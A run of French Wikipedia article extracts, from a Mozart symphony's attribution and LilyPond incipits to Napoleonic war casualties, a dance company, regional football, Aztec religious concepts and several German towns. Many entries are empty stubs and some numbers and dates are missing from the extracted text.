Dans son édition du catalogue Köchel, Alfred Einstein rejette la paternité de Léopold, indiquant qu'il serait étrange que Léopold ait composé l'une des plus "charmantes et intelligentes" des symphonies italiennes de 1770. Toutefois, dans le cas semblable de la symphonie "Lambach", la symphonie la « plus moderne » "New Lambach" s'est avérée être un travail de Léopold. En outre, Neal Zaslaw n'est pas d'accord avec le point de vue (« charmante et intelligente ») sur la symphonie , la qualifiant de « brillante, superficielle et conventionnelle ».
Bernhard Paumgartner attribue la symphonie à Wolfgang, et affirme (d'accord avec Wolfgang Gersthofer) que ces quatre symphonies italiennes se ressemblaient, ce qui rend probable qu'elles soient toutes l'œuvre du même compositeur, et qu'elles sont caractéristiques des symphonies de Mozart composées en Italie. Ainsi, ils estiment qu'il est très probable que Mozart soit l'auteur des quatre symphonies.
La Alte Mozart-Ausgabe (publiée en 1879–1882) attribue les nombres 1–41 aux 41 symphonies portant des numéros. Les symphonies non numérotées (certaines, dont , publiées dans les suppléments du Alte-Mozart Ausgabe jusqu'en 1910) ont été parfois numérotées avec les nombres de 42 à 56, bien qu'elles aient été écrites avant la Symphonie de Mozart (écrite en 1788). La symphonie a ainsi reçu le numéro 44.
Instrumentation.
Dans les orchestres d'aujourd'hui, on ajoute habituellement des bassons et un clavecin pour renforcer les basses et le continuo. Les cors se taisent pendant le second mouvement.
Structure.
La forme de la symphonie est celle d'une symphonie italienne ou ouverture.
Elle comprend trois mouvements :
La durée de la symphonie est d'environ .
Introduction de l'"Allegro":
\relative c' {
 \key d \major
 d2\f^\markup { \italic Allegro } fis4 a |
 d4 r r d' |
 \grace cis8 (b4) a r d |
 \grace cis8 (b4) a \grace a16 (g8) (fis16 g) e8 r |
 fis16 g a b a8 fis, g[ e a a,]
 d4 r4 r4
&lt;/score&gt;
Introduction de l'"Andante":
\new StaffGroup «
\new Staff
\with {
 instrumentName = #"V1"
\relative c" {
 \key g \major
 \time 2/4
 g'8\p^\markup { \italic Andante } (d) r4
 g8 (e) r4
 c8.\trill ([b32 c]) [d8-. c-.] b-. d-. r4
 g8 (d) r4
 g8 (e) r4
 c8.\trill ([b32 c]) [d8-. c-.] b-. g-. r4
 \new Staff
 \with {
 instrumentName = #"V2"
 \relative c" {
 \key g \major
 \time 2/4
 r4 g'8\p (d)
 r4 g8 (e)
 a,8.\trill ([g32 a]) [b8-. a-.] g-. b-. r4
 r4 g'8 (d)
 r4 g8 (e)
 a,8.\trill ([g32 a]) [b8-. a-.] g-. b,-. r4
»
&lt;/score&gt;
Introduction de l'"Allegro molto":
\relative c" {
 \key d \major
 \time 3/8
 &lt;d, d'&gt;4. \f^\markup { \italic Allegro \italic molto } a'
 fis8 d a'
 fis d r8
 a'4. g
 fis8 g a
 g fis e
 &lt;d d'&gt;4. a'
 fis8 d a'
 fis d r8
 a'4. g
 fis8 g a
 g fis e
 d4 r8
&lt;/score&gt;

</doc>
<doc id="6806735" url="https://fr.wikipedia.org/wiki?curid=6806735" title="Paniegekko">
Paniegekko



</doc>
<doc id="6806746" url="https://fr.wikipedia.org/wiki?curid=6806746" title="Alexeï Nikolaïevitch Kouropatkine">
Alexeï Nikolaïevitch Kouropatkine



</doc>
<doc id="6806747" url="https://fr.wikipedia.org/wiki?curid=6806747" title="La Théorie des cordes">
La Théorie des cordes

La Théorie des cordes est un roman de l'auteur espagnol José Carlos Somoza, publié originellement en 2006 aux éditions sous le titre "Zig Zag". Le roman a été traduit en français par Marianne Millon en 2007, pour les éditions Actes Sud, dans la collection Babel.
Le livre est considéré comme un roman de science-fiction, cependant son intrigue relève d'un thriller doublée d’une promenade du côté des théories physiques du même nom. Certains passages relèvent d'un style horrifique, ce qui apporte une diversité d'écriture au sein de l'œuvre. 
Lors de l'écriture du livre, José Carlos Somoza s'est entretenu avec plusieurs représentants scientifiques, afin de s'assurer de la cohérence des hypothèses physiciennes qu'il expose. Selon l'auteur, ce fut seulement après leur agrément qu'il aura publié son œuvre. Ceci aura eu pour objectif de permettre à l'intrigue de ne pas rentrer en contradiction avec l'état des connaissances scientifiques au moment de l'écriture de l'œuvre, ainsi pour classer "La Théorie des cordes" il serait judicieux d'employer le terme de Hard science-fiction.
Intrigue.
Elisa Robledo physicienne à Madrid lit un article de journal et reçoit un coup de téléphone qui la bouleverse. Cet évènement la replonge dans une histoire passée terrible lors de laquelle elle travaillait coupée du monde avec une équipe de scientifiques sur la célèbre théorie des cordes.
Un flashback permet de comprendre l'importance de cette période sur la vie d'Elisa. On apprend comment et pourquoi elle fut recrutée, avec qui et sur quoi elle travailla et comment les évènements ont mal tourné, conduisant à un terrible accident.
Un retour au temps présent apporte les réponses aux questions que l'on ne cesse de se poser à mesure que l'intrigue se dévoile.
Cette aventure aura un effet perturbant pour les croyances scientifiques d'Elisa Robledo. Quelques lignes issues du texte : "Elle pensa que la science, la véritable science, celle qui change soudain et pour toujours le cours de l'histoire, consistait à ça : à pleurer en voyant une pomme tomber d'un arbre."
Réception de l'ouvrage par le public français.
La presse spécialisée a accueilli l'œuvre de José Carlos Somoza de façon très positive : par exemple la critique de Patrick Imbert, parue dans le magazine "Bifrost" , : « "La Théorie des cordes" s'impose comme le meilleur roman écrit sur la question [...] Plongée psychanalytique dans l'univers des "Dix petits nègres" à la sauce "Planète interdite", le roman de Somoza se dévore d'une traite et horrifie peu à peu son lecteur avec ses descriptions impeccables et cette sensation d'angoisse étonnamment bien rendue ».
Cependant, malgré une bonne réception du livre de la part de critiques spécialisés en science-fiction , l'ouvrage n'a pas eu un très grand succès auprès du public français. Le mélange des thèmes de science-fiction et de sciences physiques restreint le nombre de lecteurs en mesure d'apprécier le sujet.

</doc>
<doc id="6806760" url="https://fr.wikipedia.org/wiki?curid=6806760" title="Pertes humaines lors des guerres napoléoniennes">
Pertes humaines lors des guerres napoléoniennes

Les pertes humaines des guerres napoléoniennes (1803-1815), directes et indirectes, s'évaluent comme ci-dessous ; les morts inscrites incluent aussi bien les morts au combat que les morts liées aux blessures, maladies, famines, hypothermie, tirs amis, etc.
Pertes de l'Empire français.
L'estimation précise des pertes demeure très difficile notamment en raison du fait que, selon l'historien Alain Pigeard, spécialiste de l'histoire militaire napoléonienne, les partisans de l'Empereur cherchent à minimiser les chiffres des pertes, alors que ses détracteurs cherchent à les gonfler. 
Selon les historiens français.
Selon l'historien Thierry Lentz, qui s'appuie sur les travaux réalisées dans les années 1970 par le démographe-historien Jacques Houdaille, les pertes françaises . Le site de la Fondation Napoléon, que Thierry Lentz dirige depuis 2000, reprend ces mêmes chiffres : pour environ 2,2 millions d’hommes mobilisés par la France de 1800 à 1815, et près de 50 % des pertes survenues en 1812-1814. La Fondation Napoléon précise aussi qu'
L'historien Alain Pigeard considère que ont été « appelés » au service militaire, de 1799 à 1815. En enlevant les 15 à 25 % de réfractaires ou d'insoumis, environ deux millions de Français servirent durant cette période. Il estime les pertes à , alliés de la France compris, dont français, chiffre élevé, mais 
En 2023, dans "L'Infographie de l'Empire napoléonien", les historiens Vincent Haegele et Frédéric Bey donnent un bilan d'environ morts causés par les guerres et les épidémies, de 1792 à 1815, soit 3,2 % de la population, dont :
Pour les forces alliées à l'Empire, Vincent Haegele et Frédéric Bey donnent les bilans suivants : 
Selon les historiens étrangers.
L'historien David Gates affirme quant à lui que 916 000 soldats français sont morts.
Pertes des Coalisés.
Pour les armées coalisées, le site de la Fondation Napoléon dirigée par Thierry Lentz explique que : 
En 2020, les recherches de l'historien Alexander Mikaberidze aboutissent à un bilan de deux millions de morts parmi les soldats des forces coalisées.
En 2023, dans "L'Infographie de l'Empire napoléonien", les historiens Vincent Haegele et Frédéric Bey donnent le bilan suivant pour les pertes des Alliés, causées par les guerres et les épidémies, de 1792 à 1815 :
Total des pertes et des disparus.
Néanmoins, ces chiffres sont très variables selon les historiens.
En partant du principe que les alliés et ennemis de la France subirent « des pertes « légèrement supérieures » à celles de la Grande Armée », Thierry Lentz estime qu'au total , non compris les pertes civiles.
David Gates estime que d'hommes ont été tués durant les guerres napoléoniennes. Il n'a pas précisé si ce nombre incluait les pertes civiles ou juste les pertes militaires.
Charles Esdaile estime au nombre de 4 millions à 7 millions des pertes totales, incluant les civiles. 
Erik Durschmied, dans son livre ", donne le nombre de 1,4 million de Français morts de toutes causes (maladies, disparus, famine). 
Adam Zamoyski estime que russes sont morts durant la seule campagne de Russie (1812). Les pertes civiles durant cette campagne étaient probablement comparables. 
Alan Schom estime que 3 millions de militaires sont morts durant les guerres napoléoniennes. 
En 2023, dans "L'Infographie de l'Empire napoléonien", les historiens Vincent Haegele et Frédéric Bey, donnent un bilan de 4,5 millions de morts (dont environ militaires et civils) pour l'ensemble des pertes causées par les combats et les épidémies, de 1792 à 1815, lors des guerres de la Révolution française et des guerres napoléoniennes.
Les pertes civiles sont impossibles à estimer avec précision. Alors que les pertes militaires sont toujours estimées entre 2 millions et 3,5 millions de morts, les pertes civiles varient de . Ainsi, les estimations des pertes au total, à la fois militaire et civile, s'évaluent entre .
Rapport des pertes humaines en Europe en 1800.
La population totale européenne en 1800 est estimée à 187 millions, ainsi si les pertes sont entre 3 et 7 millions, cela représente 1,6 % à 3,7 % de cette population.

</doc>
<doc id="6806767" url="https://fr.wikipedia.org/wiki?curid=6806767" title="Système Castafiore">
Système Castafiore

La compagnie Système Castafiore, créée en 1989, est une compagnie de danse conventionnée par le Ministère de la Culture et de la Communication (DRAC PACA), le Conseil général des Alpes-Maritimes, le Conseil régional de Provence-Alpes-Côte d'Azur, actuellement en résidence à Grasse.
Les spectacles de cette compagnie allient danse, jeu théâtral, images de synthèse et installations sonores. Cette pluridisciplinarité est possible grâce à l’union de la chorégraphe Marcia Barcellos et le metteur en scène et musicien Karl Biscuit, tous deux anciens élèves d'Alwin Nikolais.
À ce jour, la compagnie compte 19 créations dont plusieurs sont des commandes pour des ballets nationaux.
Les fondateurs.
Marcia Barcellos.
Marcia Barcellos est née à São Paulo, avant de venir en France à ses 17 ans. Elle participe à un stage d’été organisé par Alwin Nikolais. Par la suite, elle rejoint le Centre national de danse contemporaine d'Angers. Après avoir dansé plusieurs créations d’Alwin Nikolais, elle part à Paris et suit cette fois le travail de Quentin Rouillier.
En 1981, elle fonde le collectif Lolita avec d’autres artistes dont Dominique Rebaud, Alain Michon, Santiago Sempere.
En 1986, elle rejoint le groupe Tuxedomoon en tant que chanteuse.
En 1989, elle fonde avec Karl Biscuit la compagnie Système Castafiore.
Karl Biscuit.
Karl Biscuit est un compositeur doublé d’un metteur en scène. Il est issu de la mouvance des musiques expérimentales nord-européennes, il fait partie du label Crammed Discs.
Il signe des musiques pour des chorégraphes comme Philippe Decouflé ou Dominique Boivin.
Il se forme à l’écriture chorégraphique avec Alwin Nikolais puis rencontre Marcia Barcellos avec qui il fonde la compagnie Système Castafiore.
Inspiration Alwin Nikolais.
Alwin Nikolais était un danseur et chorégraphe qui a révolutionné la danse moderne. Lui-même inspiré par la danse de Mary Wigman et de Hanya Holm, il fut un des premiers à expérimenter la danse comme un art total et à remettre en question la conception traditionnelle du danseur.
La compagnie Système Castafiore s’est beaucoup inspirée de son travail pour constituer leurs spectacles, notamment pour "Stand Alone Zone".
Projet chorégraphique.
Le projet chorégraphique de Système Castafiore procède d'une approche complexe. En effet, on constate une grande diversité tant dans les sources d’inspirations que dans les formes utilisées mais aussi dans le rapport que la danse entretient avec les autres disciplines. La musique permet aux danseurs d'incarner des voix constituées en scénario sonore. Le costume réinvente des morphologies et prolonge le corps grâce aux accessoires et masques. L'image numérique propose des nouveaux territoires scénographiques. Le tout s'imbrique parfaitement dans une forme de théâtre chorégraphique qui propose différents niveaux de lecture et s'ouvre en cela à l'imaginaire du spectateur. 
La compagnie Système Castafiore s’intéresse aux nouvelles imageries que proposent les arts numériques, notamment le cinéma d'animation, les vidéos expérimentales et l’univers du jeu vidéo.
Ils s’attachent, en particulier, au mode de mise en jeu de ces dispositifs dans le champ du spectacle vivant. Les outils se sont largement démocratisés et offrent aux artistes un vaste terrain d'expérimentation, de bricolage, de réappropriation.
De leur point de vue, les arts numériques participeront à l'émergence de nouvelles formes théâtrales et chorégraphiques en inventant une poétique de demain.
En 2013, une fabrique de spectacle dont la direction sera confiée à Système Castafiore, verra le jour sur le territoire de l'agglomération Grasse-Mouans-Sartoux. Il s’agira d’un outil de création d’abord pour la danse. Cependant il sera mis à disposition un grill technique, et des ateliers décors, costumes, vidéo et son. Cette fabrique permettra à la compagnie de monter de nouvelles créations mais aussi d’accueillir d’autres compagnies. Cet outil de création sera en relation avec un nouveau théâtre de 800 places. Tout cet ensemble sera, pour la région, un lieu unique de création artistique et notamment dans le champ chorégraphique.

</doc>
<doc id="6806771" url="https://fr.wikipedia.org/wiki?curid=6806771" title="Doug Nordquist">
Doug Nordquist

Douglas « Doug » Nordquist (né le à San Gabriel) est un athlète américain, spécialiste du saut en hauteur. 
Biographie.
Deuxième des sélections olympiques américaines de 1984, derrière son compatriote Dwight Stones, il participe aux Jeux de Los Angeles où il termine cinquième du concours avec une barre à . Il s'illustre par la suite à l'occasion des Goodwill Games en décrochant la médaille d'or en 1986, et l'argent en 1990.
Il remporte à deux reprises le titre en plein air des Championnats des États-Unis d'athlétisme, en 1986 et 1988. 

</doc>
<doc id="6806772" url="https://fr.wikipedia.org/wiki?curid=6806772" title="Douglas Nordquist">
Douglas Nordquist



</doc>
<doc id="6806774" url="https://fr.wikipedia.org/wiki?curid=6806774" title="Château de Brinon-sur-Sauldre">
Château de Brinon-sur-Sauldre

Le château de Brinon est situé sur la commune de Brinon-sur-Sauldre, dans le département du Cher.
Historique.
Il est construit en 1604 et restauré à la fin du siècle

</doc>
<doc id="6806789" url="https://fr.wikipedia.org/wiki?curid=6806789" title="Monastère de Santa Maria de Vilabertran">
Monastère de Santa Maria de Vilabertran

Le monastère de Santa Maria est un monastère situé sur le territoire de Vilabertran, commune de la comarque d'Alt Empordà dans le nord de la province de Gérone et de la communauté autonome de Catalogne en Espagne.
Localisation.
Vilarbertran et son monastère se situent à au nord-est de la ville de Figueres, célèbre pour son Musée Dali.
Historique.
L'église de la fin du possède un clocher roman lombard du et un cloître des .
Architecture extérieure.
La façade et le clocher roman lombard.
La façade de l'église conventuelle, asymétrique, présente un splendide clocher de style roman lombard à gauche et la base d'une tour inachevée à droite.
Le clocher lombard, percé de nombreux trous de boulin (trous destinés à ancrer les échafaudages), est constitué de cinq niveaux : un premier niveau aveugle édifié en moellons, un second niveau aveugle édifié en pierre de taille et trois étages ornés de baies géminées à colonnettes et de bandes lombardes. Chacun de ces trois étages est surmonté d'une frise de dents d'engrenage.
La partie centrale de la façade présente un portail très dégradé qui se réduit à un linteau rectangulaire supporté par des pilastre cannelés et est flanqué de chaque côté de quatre massifs piliers.
Ce portail est surmonté d'une fenêtre à triple ébrasement dont l'archivolte est ornée d'une frise de dents d'engrenage cintrée.
La façade se termine par un pignon à corniche moulurée.
Le chevet.
Le chevet est constitué d'une puissante abside centrale et de deux absidioles de petite taille, toutes trois couvertes de lauzes.
L'abside centrale est édifiée en moellons sur un tiers de sa hauteur. Sa partie supérieure, édifiée en pierre de taille assemblée en moyen appareil, est percée d'une fenêtre absidiale unique dont l'archivolte est ornée d'une frise de dents d'engrenage cintrée. L'abside est couronnée d'une frise de dents d'engrenage et d'une forte corniche en pierre.
Les absidioles, nettement plus petites, sont édifiées en moellons sur les deux tiers de leur hauteur et en pierre de taille pour le surplus.
L'abside centrale, percée comme le clocher de nombreux trous de boulin, prend appui sur un pignon percé d'un double oculus.
Le cloître.
Le monastère de Santa Maria possède un beau cloître roman des .
Ses galeries sont ornées d'arcades portées en alternance par des piliers rectangulaires et par des colonnes groupées par deux.
Sur trois des quatre côtés, les arcades sont surmontées par une puissante frise de dents d'engrenage.
Architecture intérieure.
L'église présente une belle abside voûtée en cul de four, ornée de sept arcades dont une seule est percée d'une fenêtre. Chacune des arcades extérieures est percée d'une niche aveugle.
La nef est couverte par une voûte en berceau soutenue par de puissants arcs-doubleaux retombant sur des colonnes engagées adossées aux piles qui séparent la nef des collatéraux.
Protection.
Le monastère fait l’objet d’un classement en Espagne en tant que monument historique au titre de bien d'intérêt culturel depuis le sous la référence RI-51-0000353.
Il fait également l’objet d’un classement en Catalogne au titre de bien culturel d'intérêt national depuis le sous la référence .

</doc>
<doc id="6806798" url="https://fr.wikipedia.org/wiki?curid=6806798" title="Un Visage pour l'éternité">
Un Visage pour l'éternité



</doc>
<doc id="6806802" url="https://fr.wikipedia.org/wiki?curid=6806802" title="Hôtel Périer du Bignon">
Hôtel Périer du Bignon

L’hôtel Périer du Bignon est un hôtel particulier situé à Laval, dans le département de la Mayenne.
Histoire.
L'hôtel fut construit 
Ce bâtiment fait l’objet d’une inscription au titre des monuments historiques depuis le .

</doc>
<doc id="6806804" url="https://fr.wikipedia.org/wiki?curid=6806804" title="Baraka (Congo-Kinshasa)">
Baraka (Congo-Kinshasa)



</doc>
<doc id="6806809" url="https://fr.wikipedia.org/wiki?curid=6806809" title="SAS-2">
SAS-2



</doc>
<doc id="6806813" url="https://fr.wikipedia.org/wiki?curid=6806813" title="Wilmann">
Wilmann

Variante : Willmann
Variante : Willman
Variante : Wilman

</doc>
<doc id="6806814" url="https://fr.wikipedia.org/wiki?curid=6806814" title="Championnat d'Europe junior de hockey sur glace 1968">
Championnat d'Europe junior de hockey sur glace 1968

Le &lt;dfn&gt;championnat d'Europe junior de hockey sur glace 1968&lt;/dfn&gt; est la première édition de cette compétition de hockey sur glace junior organisée par la Fédération internationale de hockey sur glace. Il se déroule du au à Tampere en Finlande. Invaincue au cours du tournoi, la Tchécoslovaquie remporte le premier titre, l'Union soviétique et la Suède prenant respectivement l'argent et le bronze.
Qualifications.
Afin de déterminer les six équipes participantes, un tour de qualification est joué en novembre et décembre 1967. En tant que pays organisateur, la Finlande en est exemptée. L'Allemagne de l'Est, la Pologne, la Suède et l'Union soviétique remportent leurs confrontations respectives. Prévue d'affronter l'Allemagne de l'Ouest à Augsbourg, la Tchécoslovaquie se qualifie à la suite du forfait de son adversaire.

</doc>
<doc id="6806815" url="https://fr.wikipedia.org/wiki?curid=6806815" title="ISEE-1">
ISEE-1



</doc>
<doc id="6806817" url="https://fr.wikipedia.org/wiki?curid=6806817" title="ISEE-2">
ISEE-2



</doc>
<doc id="6806818" url="https://fr.wikipedia.org/wiki?curid=6806818" title="ISEE-3/ICE">
ISEE-3/ICE



</doc>
<doc id="6806823" url="https://fr.wikipedia.org/wiki?curid=6806823" title="Cirque Britania">
Cirque Britania



</doc>
<doc id="6806824" url="https://fr.wikipedia.org/wiki?curid=6806824" title="Cirque Pinder Jean Richard">
Cirque Pinder Jean Richard



</doc>
<doc id="6806826" url="https://fr.wikipedia.org/wiki?curid=6806826" title="Noire victoire">
Noire victoire



</doc>
<doc id="6806828" url="https://fr.wikipedia.org/wiki?curid=6806828" title="Bloch MB.320 Hirondelle">
Bloch MB.320 Hirondelle



</doc>
<doc id="6806832" url="https://fr.wikipedia.org/wiki?curid=6806832" title="Jolene Anderson (actrice)">
Jolene Anderson (actrice)

Jolene Anderson, est née le à Kempsey, Nouvelle Galles du Sud en Australie, est une actrice australienne.
Biographie.
Jolene Anderson a étudié à l"Actor Central Australia".
Après ses études elle a voyagé durant trois ans et visité 32 pays.
Anderson a commencé sa carrière au théâtre, Queensland Theatre Company.
Anderson a joué Erica Templeton dans All Saints jusqu'au , alors que son personnage a été déclaré mort, comme elle avait été absent pendant 3 semaines. Elle était l'une des plus jeunes membres de la distribution.
Du au , Anderson a joué le premier rôle d'Hypatie, dans les fractions Queensland Theatre Company, de Marcel Dorney. Hypatie est un brillant mathématicien femme et philosophe qui, il y a 1600 ans, était responsable de la Bibliothèque d'Alexandrie - une collection de toutes les connaissances dans son monde. Lorsque l'agitation politique, des fanatiques religieux menacent de détruire la bibliothèque. Comme Hypatie se bat pour le sauver, elle est forcée de confronter son propre préjugé, et de faire un choix terrible.
Elle incarne également le Commandant Sarah Briggs dans le jeu vidéo Titanfall 2.
Filmographie.
Court Métrage :

</doc>
<doc id="6806833" url="https://fr.wikipedia.org/wiki?curid=6806833" title="Championnat de l'ASEAN de football 2012">
Championnat de l'ASEAN de football 2012

Le championnat de l'ASEAN de football 2012, surnommé « AFF Suzuki Cup 2012 » en raison de son sponsor Suzuki, est une compétition internationale de football et la édition du championnat de l'ASEAN de football.
La compétition se déroule du 24 novembre au 22 décembre 2012 en Thaïlande et en Malaisie pour la phase de groupes de la phase finale, puis dans les pays qualifiés pour la phase à élimination directe.
La Malaisie, pays hôte et tenante du titre, est éliminée en demi-finales par la Thaïlande, autre pays hôte et elle-même vaincue en finale par Singapour, qui remporte ainsi son quatrième titre après les éditions 1998, 2004 et 2007.
Tour préliminaire.
Participants.
Onze équipes (les dix pays membres de l'ASEAN ainsi que le Timor oriental) se portent candidats pour disputer cette édition 2012.
Néanmoins, la compétition ne disposant que de huit places en phase finale, un tour préliminaire de qualification est organisé afin d'éliminer trois équipes. Celui-ci se déroule du 5 au 13 octobre 2012 au stade Thuwunna de Rangoun, capitale économique et plus grande ville de Birmanie. Il oppose les cinq nations les moins bien classées de l'ASEAN :
Participants.
Équipes qualifiées d'office.
Les deux pays hôtes sont automatiquement qualifiés pour la phase finale :
Quatre autres pays sont qualifiés d'office en raison de leurs performances lors de l'édition précédente :
Équipes issues du tour préliminaire.
Deux équipes se sont qualifiées via le tour préliminaire :
Résultats.
Les huit équipes qualifiées sont réparties dans deux groupes de quatre équipes. La phase de groupe se déroule à Bangkok, du 24 au 30 novembre 2012 pour le groupe A ainsi qu'à Kuala Lumpur, du 25 novembre au décembre 2012 pour le groupe B. 
Phase de groupes.
Groupe A.
Les matchs ont lieu au stade Rajamangala et au stade Suphachalasai de Bangkok du au .
Groupe B.
Les matchs ont lieu au stade national Buki Jalil et au stade Shah Alam de Kuala Lumpur du au .
Phase à élimination directe.
Les demi-finales et la finale sont jouées en match aller-retour à domicile et à l'extérieur.
Demi-finales.
Les demi-finales ont lieu les 8 et 9 décembre pour les matchs aller et les 12 et 13 décembre pour les matchs retour.
Finale.
La finale a lieu le 19 décembre 2012 à Singapour pour la rencontre aller et le 22 décembre 2012 à Bangkok pour la rencontre retour.
Classement des buteurs.
"Sources"

</doc>
<doc id="6806843" url="https://fr.wikipedia.org/wiki?curid=6806843" title="Tōkaidōchū hizakurige">
Tōkaidōchū hizakurige

Le , abrégé en "Hizakurige", est un roman comique picaresque ("kokkeibon") écrit par Jippensha Ikku, relatant les mésaventures de deux voyageurs sur le Tōkaidō, principale route entre Edo et Kyoto au cours de l'époque d'Edo. Le livre est publié en douze parties entre 1802 et 1822.
Présentation.
Les deux principaux personnages et , souvent appelés Yaji et Kita, voyagent ("michiyuki", terme décrivant une scène de voyage) d'Edo à Kyoto sur la route du pèlerinage au Ise-jingu.
Comme ils font leur chemin, ils laissent derrière eux une traînée de plaisanteries grossières et nombre de calembours. Ils se moquent d'une "sankin kōtai" (procession de daimyos), ils trompent des commerçants à court d'argent et sont trompés à leur tour. Dans une auberge, ils se ridiculisent parce qu'ils ne savent pas comment utiliser la baignoire et se brûlent le derrière plutôt que de demander de l'aide.
À Ueno, l'un d'eux prétend être Ikku lui-même, avant qu'il s'avère être un imposteur. À cette occasion, ils se brûlent et débattent de la façon de manger des pierres chaudes qui leur ont été servies par l'aubergiste, alors que ces pierres sont destinées au séchage du "konnyaku" pour améliorer la saveur.
Des événements comiques s'ensuivent souvent lorsque Yaji ou Kita essayent de se faufiler dans le lit des femmes, ce qui arrive à différentes auberges le long de la route.
Analyse.
Le livre, bien que d'un style comique, est écrit comme un guide de voyage pour la route du Tōkaidō. Il détaille les sites célèbres à chacune des le long de la route, où les personnages se trouvent fréquemment dans des situations hilarantes. Ils se déplacent de station en station, principalement intéressés par la nourriture, le saké et les femmes. Originaires d'Edo, ils voient le monde à travers le prisme d'Edo, se jugeant eux-mêmes plus cultivés et avertis en comparaison des compatriotes qu'ils rencontrent.
Le "Hizakurige" est un roman comique qui fournit des informations et des anecdotes relatives aux diverses régions parcourues le long du Tōkaidō. Le tourisme est en plein essor au cours de la période d'Edo, lorsqu'est écrit le "Tōkaidōchū hizakurige". Cette œuvre est l'un des nombreux guides qui ont proliféré, pour aiguiser l'appétit du public pour le tourisme.
Prolongements.
Un second livre a été écrit, appelé "Zoku hizakurige", qui comprend des documents sur la vallée de Kiso, Kompira et Miyajima.
Certains des épisodes de ce roman ont été illustrés par de célèbres artistes "ukiyo-e" tels qu'Utagawa Hiroshige, dans ses "Cent vues d'Edo".
Plusieurs adaptations au cinéma existent :

</doc>
<doc id="6806844" url="https://fr.wikipedia.org/wiki?curid=6806844" title="Chitulia bituberculata">
Chitulia bituberculata



</doc>
<doc id="6806847" url="https://fr.wikipedia.org/wiki?curid=6806847" title="Teyolia">
Teyolia

Le teyolia, ou yolia est, dans la mythologie aztèque, avec le tonalli et l', une des trois composantes animiques de l'être humain. C'est la mieux documentée, et la plus comparable au concept chrétien d'âme car c'est celle qui survit à la mort dans l'au-delà.
Les Nahuas associaient le teyolia au cœur, et les considéraient comme le siège de la conscience, de la mémoire, de la volonté, des émotions, des passions et du souffle vital, leur attribuant les valeurs d'intériorité, de sensibilité et de pensée, tandis qu'ils situaient le tonalli dans la tête et l' dans le foie ; de ce fait, les sacrifices humains par cardiectomie, qui se terminaient par des offrandes consistant notamment à offrir à une divinité le cœur ainsi extrait, avaient pour but de libérer le teyolia et de transmettre ainsi de la vie, du mouvement et de l'énergie à la divinité bénéficiaire du sacrifice, ainsi qu'aux sacrifiants (commanditaires du sacrifice).
On retrouve au une survivance de ce concept chez les Nahuas de la sierra de Puebla, qui désignent sous le nom de la principale des entités animiques et le cœur.

</doc>
<doc id="6806853" url="https://fr.wikipedia.org/wiki?curid=6806853" title="Chitulia inornata">
Chitulia inornata



</doc>
<doc id="6806859" url="https://fr.wikipedia.org/wiki?curid=6806859" title="Ixiptla">
Ixiptla

L'ixiptla est, dans la religion aztèque, une incarnation d'une divinité par un être humain ou un animal, notamment à l'occasion de son sacrifice.

</doc>
<doc id="6806862" url="https://fr.wikipedia.org/wiki?curid=6806862" title="Friesack">
Friesack

Friesack est une ville allemande située dans le Land de Brandebourg dans l'arrondissement du Pays de la Havel.

</doc>
<doc id="6806866" url="https://fr.wikipedia.org/wiki?curid=6806866" title="Rhinow">
Rhinow

Rhinow est une ville allemande située dans le Land de Brandebourg dans l'arrondissement du Pays de la Havel.
Démographie.
Les sources de données se trouvent en detail dans les Wikimedia Commons.
Histoire.
Le , Otto Lilienthal, pionnier de l'aéronautique, se tue au cours du quatrième vol en planeur qu'il effectue à Rhinow.

</doc>
<doc id="6806868" url="https://fr.wikipedia.org/wiki?curid=6806868" title="Chitulia laboutei">
Chitulia laboutei



</doc>
<doc id="6806869" url="https://fr.wikipedia.org/wiki?curid=6806869" title="Niemegk">
Niemegk

Niemegk est une ville allemande située dans le Land de Brandebourg dans l'arrondissement de Potsdam-Mittelmark.

</doc>
<doc id="6806872" url="https://fr.wikipedia.org/wiki?curid=6806872" title="Destanne de Bernis">
Destanne de Bernis



</doc>
<doc id="6806873" url="https://fr.wikipedia.org/wiki?curid=6806873" title="Industrie industrialisante">
Industrie industrialisante



</doc>
<doc id="6806874" url="https://fr.wikipedia.org/wiki?curid=6806874" title="Le Roi du Curling">
Le Roi du Curling



</doc>
<doc id="6806875" url="https://fr.wikipedia.org/wiki?curid=6806875" title="Industries industrialisantes">
Industries industrialisantes



</doc>
<doc id="6806877" url="https://fr.wikipedia.org/wiki?curid=6806877" title="Pénélope Vlasto">
Pénélope Vlasto



</doc>
<doc id="6806878" url="https://fr.wikipedia.org/wiki?curid=6806878" title="Ptolemaeus (homonymie)">
Ptolemaeus (homonymie)



</doc>
<doc id="6806880" url="https://fr.wikipedia.org/wiki?curid=6806880" title="Chitulia lamberti">
Chitulia lamberti



</doc>
<doc id="6806888" url="https://fr.wikipedia.org/wiki?curid=6806888" title="Johan Ångström">
Johan Ångström

Johan (Johannes) Ångström (Lögdö 1813 - 1879 Örnskiöldsvik) est un botaniste suédois qui étudia spécialement les fougères et les mousses. Il a notamment étudié les mousses de Finlande.
Biographie.
Il explore à l'été 1843 avec son collègue Fredrik Nylander l'est du grand-duché de Finlande, la Carélie russe, au bord de la mer Blanche, et la Laponie russe. Puis ils explorent la nord de la Russie et la Laponie norvégienne.
Hommages.
Le genre "Aongstroemia" porte son nom.
Abréviation.
La majuscule de l'abréviation est officiellement un Å, diacritée d'un rond en chef. Il peut arriver qu'elle ne le soit pas.

</doc>
<doc id="6806891" url="https://fr.wikipedia.org/wiki?curid=6806891" title="Ministre de la santé">
Ministre de la santé



</doc>
<doc id="6806892" url="https://fr.wikipedia.org/wiki?curid=6806892" title="Ångstr.">
Ångstr.



</doc>
<doc id="6806900" url="https://fr.wikipedia.org/wiki?curid=6806900" title="Chitulia lapemoides">
Chitulia lapemoides



</doc>
<doc id="6806902" url="https://fr.wikipedia.org/wiki?curid=6806902" title="Ricardo de Orueta">
Ricardo de Orueta

Ricardo de Orueta, né à Malaga le et mort à Madrid le , est un important historien et critique d'art espagnol de la première moitié du .
Il a été nommé, lors de la Seconde République espagnole, Directeur général des Beaux-arts, poste pour lequel son activité d'organisation des musées et de protection du trésor artistique a été très importante.
Historien de l'art.
L'historien d'art Ricardo de Orueta appartenait à une famille malagueña de bonne éducation et très cultivée, proche de Francisco Giner de los Ríos, ce qui facilita sa formation polyglotte ; il vécut d'ailleurs par la suite 9 ans à Paris pour étudier l'art, et en particulier la sculpture. Son frère Domingo de Orueta était un important géologue.
